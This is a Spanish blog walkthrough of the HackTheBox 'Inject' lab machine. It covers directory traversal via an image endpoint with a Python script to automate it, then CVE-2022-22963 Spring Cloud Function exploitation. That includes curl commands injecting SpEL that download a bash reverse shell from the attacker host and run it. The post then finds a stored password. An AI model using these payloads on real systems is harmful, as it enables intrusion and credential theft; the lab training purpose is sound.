<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">HackTheBox - Inject | noname</title>
<meta property="og:title" content="HackTheBox - Inject | noname" />
<meta name="twitter:title" content="HackTheBox - Inject | noname" />
<meta itemprop="name" content="HackTheBox - Inject | noname" />
<meta name="application-name" content="HackTheBox - Inject | noname" />
<meta property="og:site_name" content="" />

<meta name="description" content="Writeup Inject üü¢">
<meta itemprop="description" content="Writeup Inject üü¢" />
<meta property="og:description" content="Writeup Inject üü¢" />
<meta name="twitter:description" content="Writeup Inject üü¢" />

<meta property="og:locale" content="es" />
<meta name="language" content="es" />

  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/htb/inject/" title="" />



  <meta itemprop="image" content="https://0x-noname.github.io/machines/htb/inject/inject.webp" />
  <meta property="og:image" content="https://0x-noname.github.io/machines/htb/inject/inject.webp" />
  <meta name="twitter:image" content="https://0x-noname.github.io/machines/htb/inject/inject.webp" />
  <meta name="twitter:image:src" content="https://0x-noname.github.io/machines/htb/inject/inject.webp" />




    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2023-09-12T10:30:15&#43;0200 />
    <meta property="article:published_time" content=2023-09-12T10:30:15&#43;0200 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "HackTheBox - Inject",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2023-09-12",
        "description": "Writeup Inject üü¢",
        "wordCount":  835 ,
        "mainEntityOfPage": "True",
        "dateModified": "2023-09-12",
        "image": {
        "@type": "imageObject",
        "url": "\/machines\/htb\/inject\/inject.webp"
        },
        "publisher": {
        "@type": "Organization",
        "name": "noname"
        }
    }
    </script>



<meta name="generator" content="Hugo 0.125.7">

    

    <link rel="canonical" href="https://0x-noname.github.io/writeups/htb/inject/">
    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    
  

</head>
<body data-theme = "" class="notransition">

<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="https://0x-noname.github.io/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title></title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        $ home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackmyvm/">
                        $ hmv
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackthebox/">
                        $ htb
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/vulnyx/">
                        $ nyx
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        $ whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">HackTheBox - Inject</h1>
                
                
                <div class="post-meta">
                    <time datetime="2023-09-12T10:30:15&#43;02:00" itemprop="datePublished"> Sep 12, 2023 </time>
                </div>
                
            </header>
            
            <div class="page-content">
                <p><img src="/../machines/htb/inject/inject_logo.webp" alt="logo"></p>
<ul>
<li><em>LFI - Directory Traversal</em></li>
<li><em>Spring Cloud Exploitation (CVE-2022-22963)</em></li>
<li><em>Information Leakage</em></li>
<li><em>Malicious Ansible Playbook (Privesc)</em></li>
</ul>
<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -p- -T5 -n -v 10.129.184.91
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp   open  ssh
</span></span><span class="line"><span class="cl">8080/tcp open  http-proxy
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -sVC -vvv -p 8080,22 10.129.184.91
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE     REASON  VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
</span></span><span class="line"><span class="cl">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKZNtFBY2xMX8oDH/EtIMngGHpVX5fyuJLp9ig7NIC9XooaPtK60FoxOLcRr4iccW/9L2GWpp6kT777UzcKtYoijOCtctNClc6tG1hvohEAyXeNunG7GN+Lftc8eb4C6DooZY7oSeO++PgK5oRi3/tg+FSFSi6UZCsjci1NRj/0ywqzl/ytMzq5YoGfzRzIN3HYdFF8RHoW8qs8vcPsEMsbdsy1aGRbslKA2l1qmejyU9cukyGkFjYZsyVj1hEPn9V/uVafdgzNOvopQlg/yozTzN+LZ2rJO7/CCK3cjchnnPZZfeck85k5sw1G5uVGq38qcusfIfCnZlsn2FZzP2BXo5VEoO2IIRudCgJWTzb8urJ6JAWc1h0r6cUlxGdOvSSQQO6Yz1MhN9omUD9r4A5ag4cbI09c1KOnjzIM8hAWlwUDOKlaohgPtSbnZoGuyyHV/oyZu+/1w4HJWJy6urA43u1PFTonOyMkzJZihWNnkHhqrjeVsHTywFPUmTODb8=
</span></span><span class="line"><span class="cl">|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
</span></span><span class="line"><span class="cl">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIUJSpBOORoHb6HHQkePUztvh85c2F5k5zMDp+hjFhD8VRC2uKJni1FLYkxVPc/yY3Km7Sg1GzTyoGUxvy+EIsg=
</span></span><span class="line"><span class="cl">|   256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
</span></span><span class="line"><span class="cl">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZzUvDL0INOklR7AH+iFw+uX+nkJtcw7V+1AsMO9P7p
</span></span><span class="line"><span class="cl">8080/tcp open  nagios-nsca syn-ack Nagios NSCA
</span></span><span class="line"><span class="cl">|_http-title: Home
</span></span><span class="line"><span class="cl">| http-methods: 
</span></span><span class="line"><span class="cl">|_  Supported Methods: GET HEAD OPTIONS
</span></span><span class="line"><span class="cl">|_http-open-proxy: Proxy might be redirecting requests
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h3 id="http-tcp---8080">HTTP TCP - 8080</h3>
<p><img src="/../machines/htb/inject/web.webp" alt="web"></p>
<p>Si intento subir un archivo php me responde que s√≥lo puedo subir im√°genes, cambiando la extensi√≥n a png me dejar√° subirla y abrirla.</p>
<p><img src="/../machines/htb/inject/uploaded.webp" alt="uploaded"></p>
<p>Al abrirla me muestra el siguiente error.</p>
<p><img src="/../machines/htb/inject/uploaded_error.webp" alt="uploaded_error"></p>
<p>Lanzo curl para ver la petici√≥n.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ curl -s &#39;http://10.129.184.91:8080/show_image?img=shell.png&#39;;echo
</span></span></code></pre></div><p>Me devuelve un archivo json.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">  &#34;timestamp&#34;: &#34;2023-03-14T10:22:32.153+00:00&#34;,
</span></span><span class="line"><span class="cl">  &#34;status&#34;: 500,
</span></span><span class="line"><span class="cl">  &#34;error&#34;: &#34;Internal Server Error&#34;,
</span></span><span class="line"><span class="cl">  &#34;message&#34;: &#34;URL [file:/var/www/WebApp/src/main/uploads/shell.png] cannot be resolved in the file system for checking its content length&#34;,
</span></span><span class="line"><span class="cl">  &#34;path&#34;: &#34;/show_image&#34;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><p>En el campo <code>message</code> veo una URL interesante.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&#34;message&#34;: &#34;URL [file:/var/www/WebApp/src/main/uploads/shell.png]
</span></span></code></pre></div><p>Siguiendo metodolog√≠a b√°sica obtengo un LFI.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ curl -s &#39;http://10.129.184.91:8080/show_image?img=/../../../../../../etc/passwd&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">syslog:x:104:110::/home/syslog:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span class="line"><span class="cl">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">pollinate:x:110:1::/var/cache/pollinate:/bin/false
</span></span><span class="line"><span class="cl">usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">frank:x:1000:1000:frank:/home/frank:/bin/bash
</span></span><span class="line"><span class="cl">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span class="line"><span class="cl">sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">phil:x:1001:1001::/home/phil:/bin/bash
</span></span><span class="line"><span class="cl">fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">_laurel:x:997:996::/var/log/laurel:/bin/false
</span></span></code></pre></div><p>Para moverme entre directorios creo este sencillo script en <strong>python</strong> ya que tengo la capacidad de listar los directorios y archivos.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.request</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2"> Ejemplo: &#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; /etc/passwd&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://10.129.184.91:8080/show_image?img=../../../../../..&#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">socket</span><span class="o">.</span><span class="n">setdefaulttimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="k">as</span> <span class="n">response</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">html</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">            <span class="n">html</span> <span class="o">+=</span> <span class="n">data</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">html</span><span class="o">.</span><span class="n">splitlines</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="n">urllib</span><span class="o">.</span><span class="n">error</span><span class="o">.</span><span class="n">URLError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">reason</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></div><p>Me voy a <code>/var/www</code> y veo el directorio <code>/WebApp</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ ./script.py /var/www
</span></span><span class="line"><span class="cl">html
</span></span><span class="line"><span class="cl">WebApp
</span></span></code></pre></div><p>Listo el contenido de <code>/WebApp</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ ./script.py /var/www/WebApp
</span></span><span class="line"><span class="cl">.classpath
</span></span><span class="line"><span class="cl">.DS_Store
</span></span><span class="line"><span class="cl">.idea
</span></span><span class="line"><span class="cl">.project
</span></span><span class="line"><span class="cl">.settings
</span></span><span class="line"><span class="cl">HELP.md
</span></span><span class="line"><span class="cl">mvnw
</span></span><span class="line"><span class="cl">mvnw.cmd
</span></span><span class="line"><span class="cl">pom.xml
</span></span><span class="line"><span class="cl">src
</span></span><span class="line"><span class="cl">target
</span></span></code></pre></div><p>En el archivo <code>pom.xml</code> veo la versi√≥n de spring cloud.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
</span></span><span class="line"><span class="cl">&lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;
</span></span><span class="line"><span class="cl">&lt;version&gt;3.2.2&lt;/version&gt;
</span></span></code></pre></div><p>Hago una b√∫squeda en internet y encuentro esta <a href="https://github.com/advisories/GHSA-6v73-fgf6-w5j7">informaci√≥n</a>.</p>
<p><img src="/../machines/htb/inject/vuln.webp" alt="vuln"></p>
<p>En este <a href="https://github.com/me2nuk/CVE-2022-22963">repositorio</a> hay un <strong>poc</strong> y sigo los pasos.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">curl -X POST  http://0.0.0.0:8080/functionRouter -H &#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;touch /tmp/pwned&#34;)&#39; --data-raw &#39;data&#39; 
</span></span></code></pre></div><p>Lanzo curl para crear el archivo <strong>pwned</strong> en el directorio <code>/tmp</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">curl -X POST http://10.129.184.91:8080/functionRouter -H &#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;touch /tmp/pwned&#34;)&#39; --data-raw &#39;data&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">  &#34;timestamp&#34;: &#34;2023-03-14T12:49:07.403+00:00&#34;,
</span></span><span class="line"><span class="cl">  &#34;status&#34;: 500,
</span></span><span class="line"><span class="cl">  &#34;error&#34;: &#34;Internal Server Error&#34;,
</span></span><span class="line"><span class="cl">  &#34;message&#34;: &#34;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&#34;,
</span></span><span class="line"><span class="cl">  &#34;path&#34;: &#34;/functionRouter&#34;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><p>Listo el directorio <code>/tmp</code> y veo que ha creado el archivo <strong>pwned</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ ./script.py /tmp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">.ICE-unix
</span></span><span class="line"><span class="cl">.Test-unix
</span></span><span class="line"><span class="cl">.X11-unix
</span></span><span class="line"><span class="cl">.XIM-unix
</span></span><span class="line"><span class="cl">hsperfdata_frank
</span></span><span class="line"><span class="cl">pwned
</span></span></code></pre></div><p>Para la revshell creo un archivo <code>rs</code> y lo comparto desde la m√°quina atacante.</p>
<pre tabindex="0"><code>‚ùØ cat rs
bash -i &gt;&amp; /dev/tcp/10.10.14.85/4444 0&gt;&amp;1

‚ùØ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre><p>Subo el archivo <strong>rs</strong> en el directorio <code>/tmp</code> de la v√≠ctima.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ curl -s -X POST http://10.129.184.91:8080/functionRouter -H &#39;spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&#34;curl 10.10.14.85 -o /tmp/rs&#34;)&#39; -d &#39;data&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">  &#34;timestamp&#34;: &#34;2023-**-**T**:**:**.***+00:00&#34;,
</span></span><span class="line"><span class="cl">  &#34;status&#34;: 500,
</span></span><span class="line"><span class="cl">  &#34;error&#34;: &#34;Internal Server Error&#34;,
</span></span><span class="line"><span class="cl">  &#34;message&#34;: &#34;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&#34;,
</span></span><span class="line"><span class="cl">  &#34;path&#34;: &#34;/functionRouter&#34;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><p>Verifico que se ha creado el archivo <strong>rs</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ ./script.py /tmp/
</span></span><span class="line"><span class="cl">.font-unix
</span></span><span class="line"><span class="cl">.ICE-unix
</span></span><span class="line"><span class="cl">.Test-unix
</span></span><span class="line"><span class="cl">.X11-unix
</span></span><span class="line"><span class="cl">.XIM-unix
</span></span><span class="line"><span class="cl">hsperfdata_frank
</span></span><span class="line"><span class="cl">pwned
</span></span><span class="line"><span class="cl">rs
</span></span></code></pre></div><p>Ejecuto <strong>bash</strong> y el archivo <strong>rs</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ curl -s -X POST http://10.129.184.91:8080/functionRouter -H &#39;spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&#34;bash /tmp/rs&#34;)&#39; -d &#39;data&#39;
</span></span></code></pre></div><p>Obtengo la <strong>shell</strong> como usuario <strong>frank</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nc -lvnp 4444
</span></span><span class="line"><span class="cl">listening on [any] 4444 ...
</span></span><span class="line"><span class="cl">connect to [10.10.14.85] from (UNKNOWN) [10.129.184.91] 42836
</span></span><span class="line"><span class="cl">bash: cannot set terminal process group (807): Inappropriate ioctl for device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">frank@inject:/$ 
</span></span></code></pre></div><p>Lanzo un <strong>ls</strong> al home de <strong>frank</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">frank@inject:~$ ls -laR
</span></span><span class="line"><span class="cl">./.m2:
</span></span><span class="line"><span class="cl">total 12
</span></span><span class="line"><span class="cl">drwx------ 2 frank frank 4096 Feb  1 18:38 .
</span></span><span class="line"><span class="cl">drwxr-xr-x 5 frank frank 4096 Feb  1 18:38 ..
</span></span><span class="line"><span class="cl">-rw-r----- 1 root  frank  617 Jan 31 16:55 settings.xml
</span></span></code></pre></div><p>En <code>settings.xml</code> encuentro la contrase√±a del usuario <strong>phil</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;settings</span> <span class="na">xmlns=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;servers&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;server&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;id&gt;</span>Inject<span class="nt">&lt;/id&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;username&gt;</span>phil<span class="nt">&lt;/username&gt;</span>
